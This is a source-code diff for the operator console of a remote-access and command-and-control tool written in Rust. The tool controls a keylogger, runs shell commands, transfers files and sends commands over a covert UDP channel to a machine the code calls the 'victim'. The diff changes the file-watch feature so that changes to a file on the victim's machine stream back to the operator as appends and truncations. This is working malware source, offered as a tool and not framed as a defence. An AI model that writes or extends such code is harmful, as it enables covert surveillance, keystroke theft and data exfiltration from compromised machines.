@@ -5,7 +5,7 @@
 /// - Port knock initiation via port_knkr module
 /// - Covert UDP channel for C2 commands
 /// - Keylogger control, shell execution, file transfer
-/// - File watch with Ctrl+C return to menu
+/// - File watch with delta streaming (append/truncate)
 ///
 /// Compliance: All protocol data in UDP payload only.
 /// UDP header fields are OS-managed; no transport-layer abuse.
@@ -15,7 +15,7 @@ use std::io::{self, Write};
 use std::net::{Ipv4Addr, IpAddr, SocketAddr, UdpSocket};
 use std::sync::{Arc, atomic::{AtomicBool, Ordering}};
 use std::thread;
-use std::time::{Duration, Instant};
+use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};
 
 use pnet::packet::ip::IpNextHeaderProtocols;
 use pnet::transport::{transport_channel, TransportChannelType::Layer3};
@@ -30,10 +30,11 @@ use packet::{PacketHeader, HEADER_SIZE,
              PACKET_TYPE_ACK, PACKET_TYPE_HEARTBEAT,
              PACKET_TYPE_CMD, PACKET_TYPE_CMD_RESP,
              PACKET_TYPE_CTRL, PACKET_TYPE_FILE, PACKET_TYPE_KEYLOG,
-             PACKET_TYPE_FILE_WATCH,  // ADD THIS
-             FILE_WATCH_UPDATE, FILE_WATCH_DELETE,  // ADD THIS
+             PACKET_TYPE_FILE_WATCH,
+             FILE_WATCH_APPEND, FILE_WATCH_TRUNCATE, FILE_WATCH_DELETE,
              CTRL_START_KEYLOGGER, CTRL_STOP_KEYLOGGER,
              CTRL_REQUEST_KEYLOG, CTRL_UNINSTALL};
+
 // Configuration
 const BUFFER_SIZE: usize = 4096;
 const MAX_RETRIES: u32 = 3;
@@ -58,9 +59,8 @@ pub struct Commander {
     running: Arc<AtomicBool>,
     pending_commands: HashMap<[u8; 16], Instant>,
     keylog_buffer: HashMap<Ipv4Addr, Vec<u8>>,
-    file_watch_buffer: HashMap<Ipv4Addr, Vec<u8>>,  // ADD THIS
-    file_watch_active: bool,  // ADD THIS
-    file_watch_path: Option<String>,  // ADD THIS
+    file_watch_active: bool,
+    file_watch_path: Option<String>,
     file_watch_local_path: Option<String>,
 }
 
@@ -77,10 +77,9 @@ impl Commander {
             running: Arc::new(AtomicBool::new(true)),
             pending_commands: HashMap::new(),
             keylog_buffer: HashMap::new(),
-            file_watch_buffer: HashMap::new(),  // ADD THIS
-            file_watch_active: false,  // ADD THIS
-            file_watch_path: None,  // ADD THIS
-            file_watch_local_path: None,  // ADD THIS        
+            file_watch_active: false,
+            file_watch_path: None,
+            file_watch_local_path: None,
         }
     }
 
@@ -93,7 +92,6 @@ impl Commander {
         
         ctrlc::set_handler(move || {
             println!("\nShutdown signal received");
-            // If file watch is active, just stop the watch and return to menu
             if watch_active_clone.load(Ordering::SeqCst) {
                 println!("[*] Stopping file watch...");
                 watch_active_clone.store(false, Ordering::SeqCst);
@@ -156,7 +154,6 @@ impl Commander {
         
         let selection = prompt("Selection > ");
         
-        // Check if watch was interrupted by Ctrl+C
         if !watch_active.load(Ordering::SeqCst) && self.file_watch_active {
             println!("[*] File watch was stopped");
             self.file_watch_active = false;
@@ -171,7 +168,7 @@ impl Commander {
             "4" => self.run_program(),
             "5" => self.upload_file(),
             "6" => self.download_file(),
-            "7" => self.file_watcher(watch_active),
+            "7" => self.file_watcher(&watch_active),
             "8" => {
                 if self.file_watch_active {
                     self.stop_file_watch();
@@ -324,15 +321,17 @@ impl Commander {
     fn process_incoming(&mut self) {
         if let Some(ref udp) = self.udp_socket {
             let mut buffer = [0u8; BUFFER_SIZE];
-            
+
             udp.set_read_timeout(Some(Duration::from_millis(1))).ok();
-             
+
             while let Ok((size, addr)) = udp.recv_from(&mut buffer) {
-                if size < HEADER_SIZE { continue; }
-                
-                if let Some(header) = PacketHeader::from_bytes(&buffer[..size]) {
+                if size < HEADER_SIZE {
+                    continue;
+                }
+
+                if let Some(header) = PacketHeader::from_bytes(&buffer[..HEADER_SIZE]) {
                     let payload = &buffer[HEADER_SIZE..size];
-                    
+
                     match header.packet_type {
                         PACKET_TYPE_ACK => {
                             self.pending_commands.remove(&header.message_id);
@@ -349,41 +348,53 @@ impl Commander {
                                     .extend_from_slice(payload);
                             }
                         }
-                        // ADD THIS - Handle file watch packets
                         PACKET_TYPE_FILE_WATCH => {
-                            if let Some(ip) = self.victim_ip {
-                                match header.subtype {
-                                    FILE_WATCH_UPDATE => {
-                                        if header.content_length > 0 {
-                                            // Accumulate file data
-                                            self.file_watch_buffer.entry(ip)
-                                                .or_insert_with(Vec::new)
-                                                .extend_from_slice(payload);
-                                        } else {
-                                            // Empty packet = end of update, write to file
-                                            if let Some(local_path) = &self.file_watch_local_path {
-                                                if let Some(data) = self.file_watch_buffer.get(&ip) {
-                                                    let _ = std::fs::write(local_path, data);
-                                                    println!("[*] File updated ({} bytes)", data.len());
-                                                }
-                                            }
-                                            self.file_watch_buffer.remove(&ip);
-                                        }
+                            match header.subtype {
+                                FILE_WATCH_APPEND => {
+                                    if let Some(local_path) = &self.file_watch_local_path {
+                                        let mut file = std::fs::OpenOptions::new()
+                                            .create(true)
+                                            .append(true)
+                                            .open(local_path)
+                                            .unwrap();
+                                        let _ = file.write_all(payload);
+                                        println!("[*] Appended {} bytes", payload.len());
                                     }
-                                    FILE_WATCH_DELETE => {
-                                        println!("[!] File deleted on victim");
-                                        // Handle delete (move to deleted folder)
-                                        if let Some(local_path) = &self.file_watch_local_path {
-                                            if let Some(local_filename) = local_path.split('/').last() {
-                                                let timestamp = Instant::now().elapsed().as_secs();
-                                                let deleted_path = format!("watched/deleted/{}_{}", local_filename, timestamp);
-                                                let _ = std::fs::rename(local_path, &deleted_path);
-                                            }
-                                        }
-                                        self.file_watch_active = false;
-                                    }
-                                    _ => {}
                                 }
+                                FILE_WATCH_TRUNCATE => {
+                                    if let Some(local_path) = &self.file_watch_local_path {
+                                        let _ = std::fs::OpenOptions::new()
+                                            .write(true)
+                                            .truncate(true)
+                                            .open(local_path);
+                                        println!("[*] File truncated");
+                                    }
+                                }
+                                FILE_WATCH_DELETE => {
+                                    println!("[!] File deleted remotely");
+
+                                    if let Some(local_path) = &self.file_watch_local_path {
+                                        if std::path::Path::new(local_path).exists() {
+                                            use std::time::{SystemTime, UNIX_EPOCH};
+
+                                            let timestamp = SystemTime::now()
+                                                .duration_since(UNIX_EPOCH)
+                                                .unwrap()
+                                                .as_secs();
+
+                                            if let Some(filename) = std::path::Path::new(local_path).file_name() {
+                                                let deleted_path = format!(
+                                                    "watched/deleted/{}_{}",
+                                                    filename.to_string_lossy(),
+                                                    timestamp
+                                                );
+                                                let _ = std::fs::rename(local_path, deleted_path);
+                                            }
+                                        }
+                                    }
+                                    self.file_watch_active = false;
+                                }
+                                _ => {}
                             }
                         }
                         PACKET_TYPE_HEARTBEAT => {
@@ -397,11 +408,10 @@ impl Commander {
                 }
             }
         }
-        
+
         let now = Instant::now();
-        self.pending_commands.retain(|_, sent| {
-            now.duration_since(*sent) < Duration::from_secs(10)
-        });
+        self.pending_commands
+            .retain(|_, sent| now.duration_since(*sent) < Duration::from_secs(10));
     }
 
     fn start_keylogger(&mut self) {
@@ -570,97 +580,67 @@ impl Commander {
 
     fn file_watcher(&mut self, watch_active: &Arc<AtomicBool>) {
         let remote_path = prompt("Remote file path to watch: ");
-        
+
         if remote_path.is_empty() {
             println!("[!] Invalid path");
             return;
         }
-        
+
         std::fs::create_dir_all("watched").ok();
         std::fs::create_dir_all("watched/deleted").ok();
-        
+
         let local_filename = remote_path.split('/').last().unwrap_or("watched_file");
         let local_path = format!("watched/{}", local_filename);
-        
-        println!("[*] Starting file watch on {}...", remote_path);
-        println!("[*] Local save location: {}", local_path);
-        
+
+        println!("[*] Watching {}", remote_path);
+        println!("[*] Local path {}", local_path);
+
         let mut request = Vec::new();
         request.push(0x71);
         request.push(remote_path.as_bytes().len() as u8);
         request.extend_from_slice(remote_path.as_bytes());
-        
+
         if self.send_packet(PACKET_TYPE_CMD, 0, &request).is_err() {
             println!("[!] Failed to send watch request");
             return;
         }
-        
-        println!("[+] Watch request sent. Receiving initial file content...");
-        
-        let mut file_data = Vec::new();
-        let start = Instant::now();
-        
-        while start.elapsed() < Duration::from_secs(30) && self.running.load(Ordering::SeqCst) {
-            self.process_incoming();
-            
-            if let Some(ip) = self.victim_ip {
-                if let Some(data) = self.keylog_buffer.get(&ip) {
-                    if data.len() == 1 && data[0] == 0xFF {
-                        break;
-                    }
-                    file_data.extend_from_slice(data);
-                    self.keylog_buffer.remove(&ip);
-                }
-            }
-            thread::sleep(Duration::from_millis(100));
-        }
-        
-        if !file_data.is_empty() {
-            let _ = std::fs::write(&local_path, &file_data);
-            println!("[+] Initial file saved ({} bytes)", file_data.len());
-        }
-        
-        // Set watch state
+
         self.file_watch_active = true;
         self.file_watch_path = Some(remote_path.clone());
         self.file_watch_local_path = Some(local_path.clone());
         watch_active.store(true, Ordering::SeqCst);
-        
-        println!("[*] Monitoring for file changes (Ctrl+C to stop)...");
-        let watch_start = Instant::now();
-        
-        while watch_start.elapsed() < Duration::from_secs(600) 
-              && self.running.load(Ordering::SeqCst) 
-              && watch_active.load(Ordering::SeqCst) {
+
+        while self.running.load(Ordering::SeqCst)
+            && watch_active.load(Ordering::SeqCst)
+        {
             self.process_incoming();
-            thread::sleep(Duration::from_millis(500));
+            thread::sleep(Duration::from_millis(200));
         }
-        
-        // Clean up
+
         self.file_watch_active = false;
         self.file_watch_path = None;
         self.file_watch_local_path = None;
         watch_active.store(false, Ordering::SeqCst);
-        
-        println!("[*] File watch stopped - returned to menu");
+
+        println!("[*] File watch stopped");
     }
 
     fn stop_file_watch(&mut self) {
         println!("[*] Stopping file watch...");
-        
+
         if let Some(ref remote_path) = self.file_watch_path {
             let mut stop_request = Vec::new();
             stop_request.push(0x74);
             stop_request.push(remote_path.as_bytes().len() as u8);
             stop_request.extend_from_slice(remote_path.as_bytes());
+
             let _ = self.send_packet(PACKET_TYPE_CMD, 0, &stop_request);
-            println!("[+] Stop signal sent to victim");
         }
-        
+
         self.file_watch_active = false;
         self.file_watch_path = None;
         self.file_watch_local_path = None;
-        
+
         println!("[+] File watch stopped");
     }
 
@@ -679,7 +659,6 @@ impl Commander {
     fn disconnect(&mut self) {
         println!("Disconnecting from victim...");
         
-        // Stop file watch if active
         if self.file_watch_active {
             self.stop_file_watch();
         }
